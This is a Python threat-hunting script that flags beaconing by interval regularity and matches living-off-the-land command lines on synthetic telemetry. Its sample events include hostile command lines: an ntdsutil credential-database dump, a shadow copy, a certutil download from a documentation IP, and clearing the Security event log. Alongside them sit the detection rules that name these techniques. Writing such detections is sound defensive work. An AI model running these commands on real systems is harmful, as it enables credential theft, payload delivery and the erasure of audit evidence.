# Python 3.10, standard library only.
# Run: python3 apt-hunting-signals.py
# Two hunting analytics on synthetic telemetry (documentation addresses only):
# 1 beaconing: low coefficient of variation of the interval between connections, 2 living-off-the-land command lines.
import random
import re
import statistics

random.seed(3)

def stamps(n, interval, jitter, start=0):
    t, out = start, []
    for _ in range(n):
        t += interval * (1 + random.uniform(-jitter, jitter))
        out.append(t)
    return out

# synthetic proxy log: destination -> connection timestamps in seconds over about 24 hours
flows = {
    "198.51.100.10 (updates.example)": stamps(24, 3600, 0.40),                 # hourly software update check, noisy
    "203.0.113.77 (cdn-a.example)": sorted(random.uniform(0, 86400) for _ in range(300)),   # human browsing, bursty
    "203.0.113.200 (c2.example)": stamps(288, 300, 0.10),                       # every 5 minutes with 10% jitter
    "192.0.2.50 (slow.example)": stamps(24, 3600, 0.05),                        # hourly, low jitter, low and slow
}
print("1 beacon analysis (cv = stdev/mean of the interval)")
for dest, ts in flows.items():
    gaps = [b - a for a, b in zip(ts, ts[1:])]
    cv = statistics.pstdev(gaps) / statistics.mean(gaps)
    print(f"   {dest:34} n={len(ts):3} mean gap={statistics.mean(gaps):7.0f}s cv={cv:5.2f} -> {'REVIEW' if cv < 0.25 and len(ts) >= 20 else 'ok'}")

# 2. Living off the land: legitimate tools used in ways that match published adversary behavior.
RULES = [
    (r"ntdsutil.*(ifm|snapshot)|vssadmin\s+create\s+shadow", "credential database access via shadow copy or ntdsutil"),
    (r"certutil.*-(urlcache|decode)", "certutil used as a downloader or decoder"),
    (r"wmic\s+/node:", "remote WMI execution"),
    (r"netsh\s+.*portproxy", "port forwarding set up with netsh"),
    (r"wevtutil\s+(cl|clear-log)", "event log cleared"),
]
events = [
    ("srv-it-01", "admin.jdoe", "vssadmin create shadow /for=C:"),
    ("srv-dc-02", "svc-backup", "ntdsutil \"ac i ntds\" ifm \"create full C:\\temp\\x\" q q"),
    ("wks-114", "mlee", "certutil -urlcache -f http://203.0.113.9/a.bin a.bin"),
    ("srv-app-07", "svc-app", "wevtutil cl Security"),
    ("wks-020", "pkim", "ipconfig /all"),
]
print("2 living-off-the-land rules")
for host, user, cmd in events:
    hit = [why for pat, why in RULES if re.search(pat, cmd, re.I)]
    print(f"   {host:10} {user:12} {'ALERT: ' + '; '.join(hit) if hit else 'no rule matched'}")
